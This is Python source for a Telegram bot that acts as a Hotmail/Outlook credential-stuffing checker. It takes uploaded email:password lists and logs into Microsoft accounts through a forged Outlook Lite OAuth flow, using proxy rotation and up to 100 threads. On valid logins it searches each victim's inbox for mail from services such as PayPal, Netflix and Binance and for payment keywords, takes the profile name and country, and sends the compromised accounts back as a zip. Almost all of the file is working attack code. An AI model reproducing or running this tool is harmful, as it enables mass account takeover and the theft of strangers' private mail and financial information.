        stop_text = "⏹️ إيقاف" if user_language.get(chat_id, 'ar') == 'ar' else "⏹️ Stop"
        pause_text = "⏸️ إيقاف مؤقت" if user_language.get(chat_id, 'ar') == 'ar' else "⏸️ Pause"
        resume_text = "▶️ استئناف" if user_language.get(chat_id, 'ar') == 'ar' else "▶️ Resume"
        speed_up_text = "⚡ زيادة السرعة" if user_language.get(chat_id, 'ar') == 'ar' else "⚡ Speed Up"
        speed_down_text = "🐢 تقليل السرعة" if user_language.get(chat_id, 'ar') == 'ar' else "🐢 Speed Down"
        markup.add(telebot.types.InlineKeyboardButton(stop_text, callback_data='stop_check', style='danger'))
        if pause_check_flag.get(chat_id, False):
            markup.add(telebot.types.InlineKeyboardButton(resume_text, callback_data='resume_check', style='success'))
        else:
            markup.add(telebot.types.InlineKeyboardButton(pause_text, callback_data='pause_check', style='primary'))
        markup.add(telebot.types.InlineKeyboardButton(speed_up_text, callback_data='speed_up', style='primary'))
        markup.add(telebot.types.InlineKeyboardButton(speed_down_text, callback_data='speed_down', style='primary'))
        if check_results[chat_id]['message_id']:
            try:
                bot.edit_message_text(message, chat_id=chat_id, message_id=check_results[chat_id]['message_id'], parse_mode="Markdown", reply_markup=markup)
            except ApiTelegramException:
                pass
            return None
        else:
            return bot.send_message(chat_id, message, parse_mode="Markdown", reply_markup=markup)
    elif add_stop_button and not stop_check_flag.get(chat_id, False):
        markup = telebot.types.InlineKeyboardMarkup()
        stop_text = "⏹️ إيقاف الفحص" if user_language.get(chat_id, 'ar') == 'ar' else "⏹️ Stop Check"
        markup.add(telebot.types.InlineKeyboardButton(stop_text, callback_data='stop_check', style='danger'))
        if check_results[chat_id]['message_id']:
            try:
                bot.edit_message_text(message, chat_id=chat_id, message_id=check_results[chat_id]['message_id'], parse_mode="Markdown", reply_markup=markup)
            except ApiTelegramException:
                pass
            return None
        else:
            return bot.send_message(chat_id, message, parse_mode="Markdown", reply_markup=markup)
    else:
        if check_results[chat_id]['message_id']:
            try:
                bot.edit_message_text(message, chat_id=chat_id, message_id=check_results[chat_id]['message_id'], parse_mode="Markdown")
            except ApiTelegramException:
                pass
        else:
            return bot.send_message(chat_id, message, parse_mode="Markdown")
    return None

def get_capture_hotmail(email, password, access_token, cid, chat_id, selected_services, unlinked_file_path, valid_accounts_file, written_accounts_set, file_handles, services_written_set):
    found_services = []
    has_payment = False
    try:
        search_url = "https://outlook.live.com/search/api/v2/query"
        for service_name in selected_services:
            service_info = services.get(service_name)
            if not service_info:
                continue
            senders = service_info["senders"] if "senders" in service_info else [service_info.get("sender", "")]
            for sender in senders:
                if not sender:
                    continue
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "UTC",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                        "From": 0,
                        "Query": {"QueryString": f"from:{sender}"},
                        "Size": 1,
                        "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                    }]
                }
                headers = {
                    'Authorization': f'Bearer {access_token}',
                    'X-AnchorMailbox': f'CID:{cid}',
                    'Content-Type': 'application/json'
                }
                try:
                    r = requests.post(search_url, json=payload, headers=headers, timeout=15)
                    if r.status_code == 200:
                        data = r.json()
                        if 'EntitySets' in data and len(data['EntitySets']) > 0:
                            entity_set = data['EntitySets'][0]
                            if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                                result_set = entity_set['ResultSets'][0]
                                total = result_set.get('Total', 0)
                                if total > 0:
                                    found_services.append(service_name)
                                    if service_name in file_handles:
                                        service_key = f"{service_name}|{email}"
                                        if service_key not in services_written_set:
                                            file_handles[service_name].write(f"{email}:{password}\n")
                                            file_handles[service_name].flush()
                                            services_written_set.add(service_key)
                                    with lock:
                                        if 'service_hits' not in check_results[chat_id]:
                                            check_results[chat_id]['service_hits'] = {}
                                        check_results[chat_id]['service_hits'][service_name] = check_results[chat_id]['service_hits'].get(service_name, 0) + 1
                                    break
                except Exception as e:
                    print(f"[DEBUG] فشل البحث عن الخدمة {service_name} للمستخدم {email}: {e}")
                    continue
        payment_keywords = ["amazon", "google play", "apple gift", "paypal", "balance", "credit", "card"]
        for kw in payment_keywords:
            payload_payment = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": kw},
                    "Size": 1,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            try:
                r = requests.post(search_url, json=payload_payment, headers=headers, timeout=15)
                if r.status_code == 200:
                    data = r.json()
                    if 'EntitySets' in data and len(data['EntitySets']) > 0:
                        entity_set = data['EntitySets'][0]
                        if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                            result_set = entity_set['ResultSets'][0]
                            total = result_set.get('Total', 0)
                            if total > 0:
                                has_payment = True
                                break
            except Exception as e:
                print(f"[DEBUG] فشل البحث عن كلمات دفع للمستخدم {email}: {e}")
                continue
        if found_services:
            if has_payment:
                with lock:
                    if chat_id not in referral_points:
                        referral_points[chat_id] = 0
                    referral_points[chat_id] += 5
                    check_results[chat_id]['rewards_count'] = check_results[chat_id].get('rewards_count', 0) + 1
                    save_data()
            return found_services
        else:
            account_line = f"{email}:{password}"
            with write_lock:
                if account_line not in written_accounts_set:
                    file_handles['valid_main'].write(account_line + "\n")
                    file_handles['valid_main'].flush()
                    written_accounts_set.add(account_line)
            return []
    except Exception as e:
        print(f"[DEBUG] خطأ عام في get_capture_hotmail للمستخدم {email}: {e}")
        return []

def get_infoo(email, password, token, cid, chat_id, found_services, written_accounts_set, valid_accounts_file, file_handles):
    he = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{cid}",
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    try:
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he, timeout=15)
        if r.status_code == 200:
            data = r.json()
            info_name = data.get('names', [])
            info_Loca = data.get('accounts', [])
            name = info_name[0].get('displayName', 'غير متوفر') if info_name else "غير متوفر"
            Loca = info_Loca[0].get('location', 'غير متوفر') if info_Loca else "غير متوفر"
        else:
            name = "غير متوفر"
            Loca = "غير متوفر"
    except:
        name = "غير متوفر"
        Loca = "غير متوفر"
    if Loca != "غير متوفر" and Loca:
        if 'countries_set' not in check_results[chat_id]:
            check_results[chat_id]['countries_set'] = set()
        check_results[chat_id]['countries_set'].add(Loca)
    jssj = {"AD": "🇦🇩","AE": "🇦🇪","AF": "🇦🇫","AG": "🇦🇬","AI": "🇦🇮","AL": "🇦🇱","AM": "🇦🇲","AO": "🇦🇴","AQ": "🇦🇶","AR": "🇦🇷","AS": "🇦🇸","AT": "🇦🇹","AU": "🇦🇺","AW": "🇦🇼","AX": "🇦🇽","AZ": "🇦🇿","BA": "🇧🇦","BB": "🇧🇧","BD": "🇧🇩","BE": "🇧🇪","BF": "🇧🇫","BG": "🇧🇬","BH": "🇧🇭","BI": "🇧🇮","BJ": "🇧🇯","BL": "🇧🇱","BM": "🇧🇲","BN": "🇧🇳","BO": "🇧🇴","BQ": "🇧🇶","BR": "🇧🇷","BS": "🇧🇸","BT": "🇧🇹","BV": "🇧🇻","BW": "🇧🇼","BY": "🇧🇾","BZ": "🇧🇿","CA": "🇨🇦","CC": "🇨🇨","CD": "🇨🇩","CF": "🇨🇫","CG": "🇨🇬","CH": "🇨🇭","CI": "🇨🇮","CK": "🇨🇰","CL": "🇨🇱","CM": "🇨🇲","CN": "🇨🇳","CO": "🇨🇴","CR": "🇨🇷","CU": "🇨🇺","CV": "🇨🇻","CW": "🇨🇼","CX": "🇨🇽","CY": "🇨🇾","CZ": "🇨🇿","DE": "🇩🇪","DJ": "🇩🇯","DK": "🇩🇰","DM": "🇩🇲","DO": "🇩🇴","DZ": "🇩🇿","EC": "🇪🇨","EE": "🇪🇪","EG": "🇪🇬","EH": "🇪🇭","ER": "🇪🇷","ES": "🇪🇸","ET": "🇪🇹","EU": "🇪🇺","FI": "🇫🇮","FJ": "🇫🇯","FK": "🇫🇰","FM": "🇫🇲","FO": "🇫🇴","FR": "🇫🇷","GA": "🇬🇦","GB-ENG": "🏴","GB-NIR": "🏴","GB-SCT": "🏴","GB-WLS": "🏴","GB": "🇬🇧","GD": "🇬🇩","GE": "🇬🇪","GF": "🇬🇫","GG": "🇬🇬","GH": "🇬🇭","GI": "🇬🇮","GL": "🇬🇱","GM": "🇬🇲","GN": "🇬🇳","GP": "🇬🇵","GQ": "🇬🇶","GR": "🇬🇷","GS": "🇬🇸","GT": "🇬🇹","GU": "🇬🇺","GW": "🇬🇼","GY": "🇬🇾","HK": "🇭🇰","HM": "🇭🇲","HN": "🇭🇳","HR": "🇭🇷","HT": "🇭🇹","HU": "🇭🇺","ID": "🇮🇩","IE": "🇮🇪","IL": "🇮🇱","IM": "🇮🇲","IN": "🇮🇳","IO": "🇮🇴","IQ": "🇮🇶","IR": "🇮🇷","IS": "🇮🇸","IT": "🇮🇹","JE": "🇯🇪","JM": "🇯🇲","JO": "🇯🇴","JP": "🇯🇵","KE": "🇰🇪","KG": "🇰🇬","KH": "🇰🇭","KI": "🇰🇮","KM": "🇰🇲","KN": "🇰🇳","KP": "🇰🇵","KR": "🇰🇷","KW": "🇰🇼","KY": "🇰🇾","KZ": "🇰🇿","LA": "🇱🇦","LB": "🇱🇧","LC": "🇱🇨","LI": "🇱🇮","LK": "🇱🇰","LR": "🇱🇷","LS": "🇱🇸","LT": "🇱🇹","LU": "🇱🇺","LV": "🇱🇻","LY": "🇱🇾","MA": "🇲🇦","MC": "🇲🇨","MD": "🇲🇩","ME": "🇲🇪","MF": "🇲🇫","MG": "🇲🇬","MH": "🇲🇭","MK": "🇲🇰","ML": "🇲🇱","MM": "🇲🇲","MN": "🇲🇳","MO": "🇲🇴","MP": "🇲🇵","MQ": "🇲🇶","MR": "🇲🇷","MS": "🇲🇸","MT": "🇲🇹","MU": "🇲🇺","MV": "🇲🇻","MW": "🇲🇼","MX": "🇲🇽","MY": "🇲🇾","MZ": "🇲🇿","NA": "🇳🇦","NC": "🇳🇨","NE": "🇳🇪","NF": "🇳🇫","NG": "🇳🇬","NI": "🇳🇮","NL": "🇳🇱","NO": "🇳🇴","NP": "🇳🇵","NR": "🇳🇷","NU": "🇳🇺","NZ": "🇳🇿","OM": "🇴🇲","PA": "🇵🇦","PE": "🇵🇪","PF": "🇵🇫","PG": "🇵🇬","PH": "🇵🇭","PK": "🇵🇰","PL": "🇵🇱","PM": "🇵🇲","PN": "🇵🇳","PR": "🇵🇷","PS": "🇵🇸","PT": "🇵🇹","PW": "🇵🇼","PY": "🇵🇾","QA": "🇶🇦","RE": "🇷🇪","RO": "🇷🇴","RS": "🇷🇸","RU": "🇷🇺","RW": "🇷🇼","SA": "🇸🇦","SB": "🇸🇧","SC": "🇸🇨","SD": "🇸🇩","SE": "🇸🇪","SG": "🇸🇬","SH": "🇸🇭","SI": "🇸🇮","SJ": "🇸🇯","SK": "🇸🇰","SL": "🇸🇱","SM": "🇸🇲","SN": "🇸🇳","SO": "🇸🇴","SR": "🇸🇷","SS": "🇸🇸","ST": "🇸🇹","SV": "🇸🇻","SX": "🇸🇽","SY": "🇸🇾","SZ": "🇸🇿","TC": "🇹🇨","TD": "🇹🇩","TF": "🇹🇫","TG": "🇹🇬","TH": "🇹🇭","TJ": "🇹🇯","TK": "🇹🇰","TL": "🇹🇱","TM": "🇹🇲","TN": "🇹🇳","TO": "🇹🇴","TR": "🇹🇷","TT": "🇹🇹","TV": "🇹🇻","TW": "🇹🇼","TZ": "🇹🇿","UA": "🇺🇦","UG": "🇺🇬","UM": "🇺🇲","US": "🇺🇸","UY": "🇺🇾","UZ": "🇺🇿","VA": "🇻🇦","VC": "🇻🇨","VE": "🇻🇪","VG": "🇻🇬","VI": "🇻🇮","VN": "🇻🇳","VU": "🇻🇺","WF": "🇼🇫","WS": "🇼🇸","XK": "🇽🇰","YE": "🇾🇪","YT": "🇾🇹","ZA": "🇿🇦","ZM": "🇿🇲","ZW": "🇿🇼"}
    cccc = jssj.get(Loca, '❔')
    services_str = ', '.join(found_services)
    account_line = f"{email}:{password} | Services: {services_str} | Name: {name} | Country: {Loca} {cccc}"
    with write_lock:
        if account_line not in written_accounts_set:
            file_handles['valid_main'].write(account_line + "\n")
            file_handles['valid_main'].flush()
            written_accounts_set.add(account_line)
    with lock:
        check_results[chat_id]['good'] += 1
    update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)

def check_account_hotmail(email, password, chat_id, unlinked_file_path, valid_accounts_file, written_accounts_set, file_handles, services_written_set):
    if stop_check_flag.get(chat_id, False):
        return
    if pause_check_flag.get(chat_id, False):
        while pause_check_flag.get(chat_id, False) and not stop_check_flag.get(chat_id, False):
            time.sleep(0.5)
        if stop_check_flag.get(chat_id, False):
            return
    acquired = rate_limit_semaphore.acquire(timeout=30)
    if not acquired:
        with lock:
            check_results[chat_id]['bad'] += 1
        update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
        return
    try:
        with requests.Session() as session:
            if proxies_list:
                proxy = random.choice(proxies_list)
                proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                session.proxies.update(proxy_dict)
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            for attempt in range(3):
                try:
                    r1 = session.get(url1, headers=headers1, timeout=(5, 15))
                    break
                except:
                    if attempt == 2:
                        raise
                    time.sleep(2 ** attempt)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                with lock:
                    check_results[chat_id]['bad'] += 1
                update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
                return
            if "MSAccount" not in r1.text:
                with lock:
                    check_results[chat_id]['bad'] += 1
                update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
                return
            if turbo_mode.get(chat_id, False):
                time.sleep(random.uniform(0.1, 0.3))
            else:
                time.sleep(random.uniform(0.3, 0.8))
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            for attempt in range(3):
                try:
                    r2 = session.get(url2, headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Connection": "keep-alive"
                    }, allow_redirects=True, timeout=(5, 15))
                    break
                except:
                    if attempt == 2:
                        raise
                    time.sleep(2 ** attempt)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                with lock:
                    check_results[chat_id]['bad'] += 1
                update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
                return
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
            for attempt in range(3):
                try:
                    r3 = session.post(post_url, data=login_data, headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Origin": "https://login.live.com",
                        "Referer": r2.url
                    }, allow_redirects=False, timeout=(5, 15))
                    break
                except:
                    if attempt == 2:
                        raise
                    time.sleep(2 ** attempt)
            if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
                with lock:
                    check_results[chat_id]['bad'] += 1
                update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
                return
            if "identity/confirm" in r3.text or "twofactor" in r3.text.lower():
                with lock:
                    check_results[chat_id]['bad'] += 1
                    if 'twofa_count' in check_results[chat_id]:
                        check_results[chat_id]['twofa_count'] += 1
                    else:
                        check_results[chat_id]['twofa_count'] = 1
                update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
                return
            if any(url in r3.text for url in ["Abuse", "signedout", "locked"]):
                with lock:
                    check_results[chat_id]['bad'] += 1
                update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
                return
            location = r3.headers.get("Location", "")
            if not location:
                with lock:
                    check_results[chat_id]['bad'] += 1
                update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
                return
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                with lock:
                    check_results[chat_id]['bad'] += 1
                update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
                return
            code = code_match.group(1)
            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            for attempt in range(3):
                try:
                    r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=(5, 15))
                    break
                except:
                    if attempt == 2:
                        raise
                    time.sleep(2 ** attempt)
            if r4.status_code != 200 or "access_token" not in r4.text:
                with lock:
                    check_results[chat_id]['bad'] += 1
                update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
                return
            token_json = r4.json()
            access_token = token_json["access_token"]
            mspcid = None
            for cookie in session.cookies:
                if cookie.name == "MSPCID":
                    mspcid = cookie.value
                    break
            cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
            selected_services = selected_options.get(chat_id, [])
            if not selected_services:
                selected_services = list(services.keys())
            found_services = get_capture_hotmail(email, password, access_token, cid, chat_id, selected_services, unlinked_file_path, valid_accounts_file, written_accounts_set, file_handles, services_written_set)
            if found_services:
                get_infoo(email, password, access_token, cid, chat_id, found_services, written_accounts_set, valid_accounts_file, file_handles)
            else:
                with lock:
                    check_results[chat_id]['good'] += 1
                update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
    except Exception as e:
        print(f"[DEBUG] خطأ في check_account_hotmail للمستخدم {email}: {e}")
        with lock:
            check_results[chat_id]['bad'] += 1
        update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
    finally:
        rate_limit_semaphore.release()

def send_final_report(chat_id):
    total_hits = check_results[chat_id]['good']
    if total_hits == 0:
        bot.send_message(chat_id, "⚠️ لا توجد حسابات صالحة لإرسال تقرير عنها.")
        return
    service_items = []
    service_hits_local = check_results[chat_id].get('service_hits', {})
    for service, count in service_hits_local.items():
        emoji_map = {
            "Amazon": "🛒", "Netflix": "🍿", "Spotify": "🎵", "Disney+": "🎬", "Steam": "🎮",
            "Epic Games": "🎲", "Supercell": "🏆", "PUBG Mobile": "🔫", "Free Fire": "🔥",
            "Facebook": "📘", "Instagram": "📷", "TikTok": "🎵", "Twitter": "🐦", "Snapchat": "👻",
            "PayPal": "💳", "Binance": "📈", "Google": "🔍", "Microsoft": "💻", "Apple": "🍎"
        }
        emoji = emoji_map.get(service, "🔹")
        service_items.append((service, count, emoji))
    if not service_items:
        bot.send_message(chat_id, f"✅ تم العثور على {total_hits} حساباً صالحاً، ولكن لم يتم العثور على أي خدمات مرتبطة بها.\n🔍 ملاحظة: البوت يبحث عن رسائل إلكترونية من الخدمات (مثل noreply@netflix.com). تأكد من أن هذه الحسابات قد استلمت إشعارات من الخدمات المطلوبة، أو حاول اختيار خدمات أخرى قبل الفحص.")
        return
    service_items.sort(key=lambda x: x[1], reverse=True)
    max_service_len = max((len(s) for s, _, _ in service_items), default=0)
    max_count_len = max((len(str(c)) for _, c, _ in service_items), default=0)
    table_lines = []
    table_lines.append("+-----" + "-"*max_service_len + "-----+-----" + "-"*max_count_len + "-----+")
    table_lines.append(f"| Service{' '*(max_service_len-7)} | Hits{' '*(max_count_len-4)} |")
    table_lines.append("+-----" + "-"*max_service_len + "-----+-----" + "-"*max_count_len + "-----+")
    for service, count, emoji in service_items:
        service_display = f"{emoji} {service}"
        spaces_service = max_service_len - len(service_display) + 2
        spaces_count = max_count_len - len(str(count)) + 2
        table_lines.append(f"| {service_display}{' ' * spaces_service}| {count}{' ' * spaces_count}|")
    table_lines.append("+-----" + "-"*max_service_len + "-----+-----" + "-"*max_count_len + "-----+")
    table_lines.append(f"| 📊 Total Hits{' '*(max_service_len-11)} | {total_hits}{' '*(max_count_len - len(str(total_hits)) + 2)}|")
    rewards = check_results[chat_id].get('rewards_count', 0)
    table_lines.append(f"| 🎁 Rewards Hits{' '*(max_service_len-12)} | {rewards}{' '*(max_count_len - len(str(rewards)) + 2)}|")
    twofa = check_results[chat_id].get('twofa_count', 0)
    table_lines.append(f"| 🔐 2FA{' '*(max_service_len-3)} | {twofa}{' '*(max_count_len - len(str(twofa)) + 2)}|")
    countries_len = len(check_results[chat_id].get('countries_set', set()))
    table_lines.append(f"| 🌍 Countries{' '*(max_service_len-8)} | {countries_len}{' '*(max_count_len - len(str(countries_len)) + 2)}|")
    table_lines.append("+-----" + "-"*max_service_len + "-----+-----" + "-"*max_count_len + "-----+")
    table_lines.append(f"| 🤖 Bot: @JF_7F135BOT{' '*(max_service_len + max_count_len + 5 - 19)} |")
    table_lines.append("+-----" + "-"*max_service_len + "-----+-----" + "-"*max_count_len + "-----+")
    report = "```\n" + "\n".join(table_lines) + "\n```"
    bot.send_message(chat_id, report, parse_mode="Markdown")

def start_checking(chat_id, local_combo_list):
    global is_checking_global
    stop_check_flag[chat_id] = False
    pause_check_flag[chat_id] = False
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_dir = os.path.join("Accounts", f"Session_{chat_id}_{timestamp}")
    os.makedirs(session_dir, exist_ok=True)
    unlinked_file_path = os.path.join(session_dir, f"Unlinked_{chat_id}_{timestamp}.txt")
    valid_accounts_file = os.path.join(session_dir, f"JF_7F135BOT_Valid_{timestamp}.txt")
    os.makedirs(session_dir, exist_ok=True)
    with open(valid_accounts_file, 'w', encoding='utf-8') as f:
        f.write(f"# Valid accounts from check at {timestamp}\n# Bot: @JF_7F135BOT\n\n")
    max_workers = min(current_threads.get(chat_id, 50 if not turbo_mode.get(chat_id, False) else 100), 100)
    written_accounts_set = set()
    services_written_set = set()
    file_handles = {}
    file_handles['valid_main'] = open(valid_accounts_file, 'a', encoding='utf-8')
    for service_name in selected_options.get(chat_id, []):
        service_info = services.get(service_name)
        if service_info:
            temp_service_file = os.path.join(session_dir, f"Hits_{service_name}_{timestamp}.txt")
            file_handles[service_name] = open(temp_service_file, 'w', encoding='utf-8')
            file_handles[service_name].write(f"# Bot: @JF_7F135BOT\n# Generated by JF_7F135BOT Hotmail Checker\n\n")
    start_time = time.time()
    last_update = {'good': 0, 'bad': 0}
    last_heartbeat = time.time()
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for line in local_combo_list:
                if stop_check_flag.get(chat_id, False):
                    for f in futures:
                        f.cancel()
                    break
                while pause_check_flag.get(chat_id, False) and not stop_check_flag.get(chat_id, False):
                    time.sleep(0.5)
                if time.time() - start_time > 600:
                    stop_check_flag[chat_id] = True
                    bot.send_message(chat_id, get_text('auto_stop_timeout', chat_id))
                    break
                current_good = check_results[chat_id]['good']
                current_bad = check_results[chat_id]['bad']
                if (current_good == last_update['good'] and current_bad == last_update['bad'] 
                    and time.time() - start_time > 120):
                    stop_check_flag[chat_id] = True
                    bot.send_message(chat_id, get_text('auto_stall', chat_id))
                    break
                last_update = {'good': current_good, 'bad': current_bad}
                if time.time() - last_heartbeat > 30:
                    bot.send_message(chat_id, get_text('heartbeat', chat_id))
                    last_heartbeat = time.time()
                try:
                    if ':' in line:
                        email = line.strip().split(':')[0]
                        password = line.strip().split(':')[1]
                        future = executor.submit(check_account_hotmail, email, password, chat_id, unlinked_file_path, valid_accounts_file, written_accounts_set, file_handles, services_written_set)
                        futures.append(future)
                except Exception:
                    with lock:
                        check_results[chat_id]['bad'] += 1
                    update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
            for future in futures:
                if stop_check_flag.get(chat_id, False):
                    future.cancel()
                    continue
                while pause_check_flag.get(chat_id, False) and not stop_check_flag.get(chat_id, False):
                    time.sleep(0.5)
                try:
                    future.result()
                except Exception:
                    with lock:
                        check_results[chat_id]['bad'] += 1
                    update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
    finally:
        for fh in file_handles.values():
            fh.close()
    if stop_check_flag.get(chat_id, False):
        bot.send_message(chat_id, get_text('stop_check', chat_id))
    else:
        bot.send_message(chat_id, get_text('check_complete', chat_id))
    if check_results[chat_id]['good'] == 0:
        bot.send_message(chat_id, "⚠️ لا توجد حسابات صالحة، لن يتم إرسال ملف مضغوط.")
        try:
            os.remove(valid_accounts_file)
        except:
            pass
        try:
            os.remove(unlinked_file_path)
        except:
            pass
        send_final_report(chat_id)
        is_checking_global = False
        start_next_check()
        return
    zip_path = None
    try:
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
            zip_path = tmp.name
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            added_count = 0
            for file_name in os.listdir(session_dir):
                file_path = os.path.join(session_dir, file_name)
                if os.path.isfile(file_path) and os.path.getsize(file_path) > 100:
                    zipf.write(file_path, file_name)
                    added_count += 1
        if added_count == 0:
            bot.send_message(chat_id, "⚠️ لا توجد نتائج كافية لإنشاء ملف مضغوط (جميع الملفات فارغة).")
        else:
            with open(zip_path, 'rb') as f:
                bot.send_document(chat_id, f)
    except Exception as e:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء إنشاء الملف المضغوط: {str(e)}")
        print(f"Error creating zip for {chat_id}: {e}")
        import traceback
        traceback.print_exc()
    finally:
        if zip_path and os.path.exists(zip_path):
            try:
                os.remove(zip_path)
            except:
                pass
        try:
            shutil.rmtree(session_dir)
        except:
            pass
    send_final_report(chat_id)
    try:
        os.remove(valid_accounts_file)
    except:
        pass
    try:
        os.remove(unlinked_file_path)
    except:
        pass
    is_checking_global = False
    start_next_check()

def start_next_check():
    global is_checking_global
    if is_checking_global:
        return
    if not check_queue:
        return
    next_user = check_queue.pop(0)
    data = pending_combo_data.pop(next_user, None)
    if data is None:
        start_next_check()
        return
    start_check_for_user(next_user, data['content'])

def start_check_for_user(user_id, file_content):
    global is_checking_global, combo_list
    is_checking_global = True
    try:
        file_content_str = file_content.decode('utf-8', errors='ignore')
    except:
        file_content_str = file_content.decode('latin-1', errors='ignore')
    seen = set()
    local_combo_list = []
    for line in file_content_str.splitlines():
        if ':' not in line:
            continue
        stripped = line.strip()
        if stripped not in seen:
            seen.add(stripped)
            local_combo_list.append(stripped)
    if not local_combo_list:
        bot.send_message(user_id, "⚠️ الملف لا يحتوي على أي حساب بالصيغة email:password")
        is_checking_global = False
        start_next_check()
        return
    total_combos = len(local_combo_list)
    if total_combos > 50000:
        bot.send_message(user_id, "⚠️ الملف كبير جداً (يحتوي على أكثر من 50,000 سطر)")
        is_checking_global = False
        start_next_check()
        return
    if total_combos < 5:
        bad_file_attempts[str(user_id)] = bad_file_attempts.get(str(user_id), 0) + 1
        if bad_file_attempts[str(user_id)] >= 2:
            temp_banned_until[str(user_id)] = (datetime.now() + timedelta(hours=1)).timestamp()
            save_data()
            bot.send_message(user_id, get_text('temp_banned', user_id))
            is_checking_global = False
            start_next_check()
            return
    else:
        bad_file_attempts[str(user_id)] = 0
        with lock:
            if user_id not in referral_points:
                referral_points[user_id] = 0
            referral_points[user_id] += 1
            save_data()
    bot.send_message(user_id, f"Loaded {total_combos} unique accounts. " + get_text('file_received', user_id), reply_markup=create_option_buttons(user_id))
    if check_low_points_warning(user_id):
        bot.send_message(user_id, get_text('low_points_warning', user_id))
    with combo_lock:
        combo_list = local_combo_list.copy()
    start_checking(user_id, local_combo_list)

@bot.callback_query_handler(func=lambda call: call.data == 'sell_combo')
def sell_combo_callback(call):
    user_id = call.message.chat.id
